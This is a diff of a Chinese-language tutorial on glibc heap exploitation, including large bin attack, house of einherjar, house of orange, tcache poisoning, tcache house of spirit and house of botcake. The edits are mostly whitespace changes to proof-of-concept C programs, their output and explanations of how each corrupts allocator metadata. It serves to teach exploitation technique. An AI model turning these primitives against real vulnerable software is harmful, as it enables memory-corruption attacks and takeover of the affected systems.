 This file demonstrates unsorted bin attack by write a large unsigned long value into stack
@@ -1434,12 +1403,11 @@ Let's malloc again to get the chunk we just free. During this time, the target s
 0x7fff4c4511e8: 0x7f60208a2b78
 ```
 
-
 和上一个类似，我们看到在 `free(p1)` 后，其 `bk` 指向 `main_arena+88`。假设存在漏洞可以修改其 `bk`，那么我们修改成目标地址 - 0x10 的位置，相当于伪造了一个 fake chunk。那么我们在拿回 `p1` 的时候，我们的 fake chunk 会被认为是 unsorted bin 中的下一个 chunk，因此其 `bk` 也被修改为 `main_arena+88`，于是我们在栈上写入了一个 `unsigned long` 值。
 
 ## large_bin_attack
-源码：
 
+源码：
 
 ```c
 /*
@@ -1553,9 +1521,7 @@ int main()
 }
 ```
 
-
 输出：
-
 
 ```
 This file demonstrates large bin attack by writing a large unsigned long value into stack
@@ -1588,12 +1554,12 @@ stack_var1 (0x7fff33530b00): 0xef37a0
 stack_var2 (0x7fff33530b08): 0xef37a0
 ```
 
-
 这种攻击方法在 glibc 2.29 推出，unsorted bin attack 失效之后可能会有大的用武之地。
 
 首先分配了一个 small chunk `p1`，然后分配了 2 个 large chunk `p2` 和 `p3`。在每个 chunk 后面都插一小段 fast chunk 防止合并。释放掉 `p1` 和 `p2`，两者都会进入 unsorted bin。
 
 随后申请比 `p1` 小的 chunk，这一步比较复杂：
+
 1. 从 unsorted bin 末尾拿出 `p1`，放入对应 small bin
 2. 从 unsorted bin 末尾拿出 `p2`，由于 large bin 为空，直接放入对应 large bin
 3. unsorted bin 已经空了，于是从 small bin 中拿出 `p1`，切割 0x90 的 chunk 返回给程序
@@ -1602,11 +1568,13 @@ stack_var2 (0x7fff33530b08): 0xef37a0
 再释放 `p3`，也进入 unsorted bin。这时，large bin 中有 `p2` 一个 chunk，大小为 0x410；unsorted bin 中有 `p3`，`_p1` 两个 chunk，大小分别为 0x410,0x290（0x330-0xa0）。
 
 现在假设能控制整个 `p2` 的内容，让它的 `chunk_size=0x3f1`，`bk=addr1` 且 `bk_nextsize=addr2`。那么再次申请 small chunk 时：
+
 1. 从 unsorted bin 末尾拿出 `_p1`，放入对应 small bin
 2. 从 unsorted bin 末尾拿出 `p3`，准备放入对应 large bin，但是对应 large bin 非空
 3. 从对应 large bin 第一个 chunk（`p2`）开始遍历，由于 `p2` 大小被修改，`0x3f0 < 0x410`，所以 `p3` 插入到了链表头。
 
 插入的代码是这样的，注意这里没有检查 `bk_nextsize` 的合法性：
+
 ```c
 if ((unsigned long) size == (unsigned long) fwd->size)
   /* Always insert in the second position.  */
@@ -1620,9 +1588,11 @@ else
   }
 bck = fwd->bk;
 ```
+
 这里的 `victim` 是 `p3`，`fwd` 是 `p2`，注意两者大小不能相等，因为漏洞在 `else` 里。由于 `fwd->bk_nextsize` 是 `addr2`，于是第二行把这个值给了 `victim->bk_nextsize`，第四行就等价于 `*(addr2+4) = victim`。
 
 同时，这里令 `bck = fwd->bk` 即 `addr1`，而接着还会执行一段代码：
+
 ```c
 mark_bin (av, victim_index);
 victim->bk = bck;
@@ -1630,12 +1600,12 @@ victim->fd = fwd;
 fwd->bk = victim;
 bck->fd = victim;
 ```
+
 这里 `bck->fd = victim` 就等价于 `*(addr1+2) = victim`。于是我们成功修改了 `addr1+2` 和 `addr2+4` 的值。
 
 ## house_of_einherjar
 
 源码：
-
 
 ```c
 #include <stdio.h>
@@ -1652,17 +1622,17 @@ bck->fd = victim;
 
 int main()
 {
-	fprintf(stderr,"Welcome to House of Einherjar!\n");
-	fprintf(stderr,"Tested in Ubuntu 16.04 64bit.\n");
-	fprintf(stderr,"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
+    fprintf(stderr,"Welcome to House of Einherjar!\n");
+    fprintf(stderr,"Tested in Ubuntu 16.04 64bit.\n");
+    fprintf(stderr,"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
-	uint8_t* a;
-	uint8_t* b;
-	uint8_t* d;
+    uint8_t* a;
+    uint8_t* b;
+    uint8_t* d;
 
-	fprintf(stderr,"\nWe allocate 0x38 bytes for 'a'\n");
-	a = (uint8_t*) malloc(0x38);
-	fprintf(stderr,"a: %p\n", a);
+    fprintf(stderr,"\nWe allocate 0x38 bytes for 'a'\n");
+    a = (uint8_t*) malloc(0x38);
+    fprintf(stderr,"a: %p\n", a);
 
     int real_a_size = malloc_usable_size(a);
     fprintf(stderr,"Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);
@@ -1691,23 +1661,23 @@ int main()
     fprintf(stderr,"fwd_nextsize: %#lx\n", fake_chunk[4]);
     fprintf(stderr,"bck_nextsize: %#lx\n", fake_chunk[5]);
 
-	/* In this case it is easier if the chunk size attribute has a least significant byte with
-	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of
-	 * the chunk includes the amount requested plus some amount required for the metadata. */
-	b = (uint8_t*) malloc(0xf8);
+    /* In this case it is easier if the chunk size attribute has a least significant byte with
+     * a value of 0x00. The least significant byte of this will be 0x00, because the size of
+     * the chunk includes the amount requested plus some amount required for the metadata. */
+    b = (uint8_t*) malloc(0xf8);
     int real_b_size = malloc_usable_size(b);
 
-	fprintf(stderr,"\nWe allocate 0xf8 bytes for 'b'.\n");
-	fprintf(stderr,"b: %p\n", b);
+    fprintf(stderr,"\nWe allocate 0xf8 bytes for 'b'.\n");
+    fprintf(stderr,"b: %p\n", b);
 
-	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
+    uint64_t* b_size_ptr = (uint64_t*)(b - 8);
     /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/
 
-	fprintf(stderr,"\nb.size: %#lx\n", *b_size_ptr);
-	fprintf(stderr,"b.size is: (0x100) | prev_inuse = 0x101\n");
-	fprintf(stderr,"We overflow 'a' with a single null byte into the metadata of 'b'\n");
-	a[real_a_size] = 0;
-	fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);
+    fprintf(stderr,"\nb.size: %#lx\n", *b_size_ptr);
+    fprintf(stderr,"b.size is: (0x100) | prev_inuse = 0x101\n");
+    fprintf(stderr,"We overflow 'a' with a single null byte into the metadata of 'b'\n");
+    a[real_a_size] = 0;
+    fprintf(stderr,"b.size: %#lx\n", *b_size_ptr);
     fprintf(stderr,"This is easiest if b.size is a multiple of 0x100 so you "
            "don't change the size of b, only its prev_inuse bit\n");
     fprintf(stderr,"If it had been modified, we would need a fake chunk inside "
@@ -1746,9 +1716,7 @@ int main()
 }
 ```
 
-
 输出：
-
 
 ```
 Welcome to House of Einherjar!
@@ -1792,7 +1760,6 @@ Now we can call malloc() and it will begin in our fake chunk
 Next malloc(0x200) is at 0x7fffd1743250
 ```
 
-
 这个利用方式基于 off-by-null，首先伪造 chunk，使其 `fd,bk,fd_nextsize,bk_nextsize` 均指向自身以绕过 unlink 检查。然后申请大小以 `8` 结尾的 chunk `a`，以及实际大小以 `0` 结尾的 chunk `b`，这样从 `a` 溢出时仅仅修改了 `b` 的 `PREV_INUSE` 位，同时 `a` 还能伪造 `b` 的 `prev_size` 字段。
 
 我们将 `b` 的 `prev_size` 设置为 `b` 的 chunk 指针地址减去 fake chunk 的 chunk 指针地址，对 fake chunk 的 `size` 字段也作相应修改，那么释放 `b` 时就会和 fake chunk 合并，下次再申请时就能拿到 fake chunk 了。
@@ -1800,7 +1767,6 @@ Next malloc(0x200) is at 0x7fffd1743250
 ## house_of_orange
 
 源码：
-
 
 ```c
 #include <stdio.h>
@@ -2073,7 +2039,6 @@ int winner(char *ptr)
 }
 ```
 
-
 输出就没有必要放了。
 
 先申请了实际大小为 0x400 的 chunk，然后为了满足页对齐以及 top chunk 的 `PREV_INUSE` 位的条件，通过溢出修改 top chunk 的 `size` 为 `0xc01`。此时，如果我们再申请一个 top chunk 大小不能满足的 chunk，就会申请新的 top chunk，而 old top 进入 unsorted bin 中。
@@ -2085,6 +2050,7 @@ int winner(char *ptr)
 已知下一个文件指针位于文件指针地址 `+0x68` 处，这恰好对应于 `smallbin[4]`，存放大小为 `90-98` 之间的 small chunk。如果我们设置 old top 的大小为 `0x61`，然后申请一个小块使得 old top 不会被分配出去，那么它就会进入到 `smallbin[4]` 中，成为链表头，同时也成为了我们伪造的文件指针的 fd 指针。
 
 然后用 old top 伪造文件指针，满足这几个条件：
+
 ```c
     /*
       1. Set mode to 0: fp->_mode <= 0
@@ -2106,7 +2072,6 @@ int winner(char *ptr)
 ## calc_tcache_size
 
 源码：
-
 
 ```c
 #include <stdio.h>
@@ -2132,7 +2097,7 @@ struct malloc_chunk {
 #define SIZE_SZ (sizeof (size_t))
 
 #define MALLOC_ALIGNMENT (2 * SIZE_SZ < __alignof__ (long double) \
-			  ? __alignof__ (long double) : 2 * SIZE_SZ)
+              ? __alignof__ (long double) : 2 * SIZE_SZ)
 
 /* The corresponding bit mask value.  */
 #define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)
@@ -2159,8 +2124,8 @@ int main()
 {
     unsigned long long req;
     unsigned long long tidx;
-	fprintf(stderr,"This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.\n");
-	fprintf(stderr,"The basic formula is as follows:\n");
+    fprintf(stderr,"This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.\n");
+    fprintf(stderr,"The basic formula is as follows:\n");
     fprintf(stderr,"\t(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT\n");
     fprintf(stderr,"\tOn a 64 bit system the current values are:\n");
     fprintf(stderr,"\t\tMINSIZE: 0x%lx\n", MINSIZE);
@@ -2185,32 +2150,29 @@ int main()
 }
 ```
 
-
 输出：
-
 
 ```
 This file doesn't demonstrate an attack, but calculates the tcache idx for a given chunk size.
 The basic formula is as follows:
-	(IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
-	On a 64 bit system the current values are:
-		MINSIZE: 0x20
-		MALLOC_ALIGNMENT: 0x10
-	So we get the following equation:
-	(IDX = CHUNKSIZE - 0x11) / 0x10
+    (IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
+    On a 64 bit system the current values are:
+        MINSIZE: 0x20
+        MALLOC_ALIGNMENT: 0x10
+    So we get the following equation:
+    (IDX = CHUNKSIZE - 0x11) / 0x10
 
 BUT be AWARE that CHUNKSIZE is not the x in malloc(x)
 It is calculated as follows:
-	IF x <MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
-	ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
-	=> CHUNKSIZE = (x + 0x8 + 0xf) & ~0xf)
+    IF x <MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
+    ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
+    => CHUNKSIZE = (x + 0x8 + 0xf) & ~0xf)
 
 
 [CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x10
 
 TCache Idx: 0
 ```
-
 
 关于 tcache 介绍可以参考 [这里](http://tukan.farm/2017/07/08/tcache/)。
 
@@ -2220,30 +2182,28 @@ TCache Idx: 0
 
 源码：
 
-
 ```c
 #include <stdio.h>
 #include <stdlib.h>
 
 int main()
 {
-	fprintf(stderr,"This file demonstrates a simple double-free attack with tcache.\n");
+    fprintf(stderr,"This file demonstrates a simple double-free attack with tcache.\n");
 
-	fprintf(stderr,"Allocating buffer.\n");
-	int *a = malloc(8);
+    fprintf(stderr,"Allocating buffer.\n");
+    int *a = malloc(8);
 
-	fprintf(stderr,"malloc(8): %p\n", a);
-	fprintf(stderr,"Freeing twice...\n");
-	free(a);
-	free(a);
+    fprintf(stderr,"malloc(8): %p\n", a);
+    fprintf(stderr,"Freeing twice...\n");
+    free(a);
+    free(a);
 
-	fprintf(stderr,"Now the free list has [%p, %p].\n", a, a);
-	fprintf(stderr,"Next allocated buffers will be same: [%p, %p].\n", malloc(8), malloc(8));
+    fprintf(stderr,"Now the free list has [%p, %p].\n", a, a);
+    fprintf(stderr,"Next allocated buffers will be same: [%p, %p].\n", malloc(8), malloc(8));
 
-	return 0;
+    return 0;
 }
 ```
-
 
 输出：
 
@@ -2256,13 +2216,11 @@ Now the free list has [0x1a90260, 0x1a90260].
 Next allocated buffers will be same: [0x1a90260, 0x1a90260].
 ```
 
-
 和 fastbin 类似，tcache 也存在 double free，而且还没有链表头检查，因此只需要连续两次 free 就好了，更加简单。
 
 ## tcache_poisoning
 
 源码：
-
 
 ```c
 #include <stdio.h>
@@ -2271,38 +2229,36 @@ Next allocated buffers will be same: [0x1a90260, 0x1a90260].
 
 int main()
 {
-	fprintf(stderr,"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
-	       "returning a pointer to an arbitrary location (in this case, the stack).\n"
-	       "The attack is very similar to fastbin corruption attack.\n\n");
+    fprintf(stderr,"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
+           "returning a pointer to an arbitrary location (in this case, the stack).\n"
+           "The attack is very similar to fastbin corruption attack.\n\n");
 
-	size_t stack_var;
-	fprintf(stderr,"The address we want malloc() to return is %p.\n", (char *)&stack_var);
+    size_t stack_var;
+    fprintf(stderr,"The address we want malloc() to return is %p.\n", (char *)&stack_var);
 
-	fprintf(stderr,"Allocating 1 buffer.\n");
-	intptr_t *a = malloc(128);
-	fprintf(stderr,"malloc(128): %p\n", a);
-	fprintf(stderr,"Freeing the buffer...\n");
-	free(a);
+    fprintf(stderr,"Allocating 1 buffer.\n");
+    intptr_t *a = malloc(128);
+    fprintf(stderr,"malloc(128): %p\n", a);
+    fprintf(stderr,"Freeing the buffer...\n");
+    free(a);
 
-	fprintf(stderr,"Now the tcache list has [%p].\n", a);
-	fprintf(stderr,"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
-		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
-	a[0] = (intptr_t)&stack_var;
+    fprintf(stderr,"Now the tcache list has [%p].\n", a);
+    fprintf(stderr,"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
+        "to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
+    a[0] = (intptr_t)&stack_var;
 
-	fprintf(stderr,"1st malloc(128): %p\n", malloc(128));
-	fprintf(stderr,"Now the tcache list has [%p].\n", &stack_var);
+    fprintf(stderr,"1st malloc(128): %p\n", malloc(128));
+    fprintf(stderr,"Now the tcache list has [%p].\n", &stack_var);
 
-	intptr_t *b = malloc(128);
-	fprintf(stderr,"2nd malloc(128): %p\n", b);
-	fprintf(stderr,"We got the control\n");
+    intptr_t *b = malloc(128);
+    fprintf(stderr,"2nd malloc(128): %p\n", b);
+    fprintf(stderr,"We got the control\n");
 
-	return 0;
+    return 0;
 }
 ```
 
-
 输出：
-
 
 ```
 This file demonstrates a simple tcache poisoning attack by tricking malloc into
@@ -2322,7 +2278,6 @@ Now the tcache list has [0x7ffd4941b420].
 We got the control
 ```
 
-
 和 `fastbin_dup_into_stack` 类似，改写已经 `free` 掉的 chunk 的 `fd` 指向栈上地址，然后 `malloc` 两次即可分配到栈上。
 
 ## tcache_house_of_spirit
@@ -2335,44 +2290,42 @@ We got the control
 
 int main()
 {
-	fprintf(stderr,"This file demonstrates the house of spirit attack on tcache.\n");
-	fprintf(stderr,"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
-	fprintf(stderr,"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
-	fprintf(stderr,"(Search for strings \"invalid next size\"and \"double free or corruption\")\n\n");
+    fprintf(stderr,"This file demonstrates the house of spirit attack on tcache.\n");
+    fprintf(stderr,"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
+    fprintf(stderr,"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
+    fprintf(stderr,"(Search for strings \"invalid next size\"and \"double free or corruption\")\n\n");
 
-	fprintf(stderr,"Ok. Let's start with the example!.\n\n");
-
-
-	fprintf(stderr,"Calling malloc() once so that it sets up its memory.\n");
-	malloc(1);
-
-	fprintf(stderr,"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
-	unsigned long long *a; //pointer that will be overwritten
-	unsigned long long fake_chunks[10]; //fake chunk region
-
-	fprintf(stderr,"This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);
-
-	fprintf(stderr,"This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
-	fprintf(stderr,"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
-	fake_chunks[1] = 0x40; // this is the size
+    fprintf(stderr,"Ok. Let's start with the example!.\n\n");
 
 
-	fprintf(stderr,"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
-	fprintf(stderr,"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
+    fprintf(stderr,"Calling malloc() once so that it sets up its memory.\n");
+    malloc(1);
 
-	a = &fake_chunks[2];
+    fprintf(stderr,"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
+    unsigned long long *a; //pointer that will be overwritten
+    unsigned long long fake_chunks[10]; //fake chunk region
 
-	fprintf(stderr,"Freeing the overwritten pointer.\n");
-	free(a);
+    fprintf(stderr,"This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);
 
-	fprintf(stderr,"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
-	fprintf(stderr,"malloc(0x30): %p\n", malloc(0x30));
+    fprintf(stderr,"This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
+    fprintf(stderr,"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
+    fake_chunks[1] = 0x40; // this is the size
+
+
+    fprintf(stderr,"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
+    fprintf(stderr,"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
+
+    a = &fake_chunks[2];
+
+    fprintf(stderr,"Freeing the overwritten pointer.\n");
+    free(a);
+
+    fprintf(stderr,"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
+    fprintf(stderr,"malloc(0x30): %p\n", malloc(0x30));
 }
 ```
 
-
 输出：
-
 
 ```
 This file demonstrates the house of spirit attack on tcache.
@@ -2394,13 +2347,11 @@ Now the next malloc will return the region of our fake chunk at 0x7ffe46748fb8, 
 malloc(0x30): 0x7ffe46748fc0
 ```
 
-
 依然非常简单。相比传统 house of spirit，tcache 中不会检查被释放的 chunk 的下一个 chunk 的 `chunk_size` 字段。那么我们只要保证 fake chunk 本身的大小合法（实际上就是位于 small bin 范围内）就可以了。随后将 fake chunk 的 `mem` 指针赋值给 `a`，`free(a)` 就将 fake chunk 放进了 tcache，再次 `malloc` 即可拿到 fake chunk。
 
 ## house_of_botcake
 
 源码：
-
 
 ```c
 #include <stdio.h>
@@ -2490,9 +2441,7 @@ int main()
 }
 ```
 
-
 输出：
-
 
 ```
 This file demonstrates a powerful tcache poisoning attack by tricking malloc into
@@ -2526,7 +2475,6 @@ Note:
 And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim
 In that case, once you have done this exploitation, you can have many arbitary writes very easily.
 ```
-
 
 首先用 7 个 0x100 的 chunk 填满 tcache，再次申请 0x100 的 chunk `a` 并释放就只能进入 unsorted bin。如果它上一个 chunk 同样是 0x100 并且也被释放，那么它们就会合并。
 
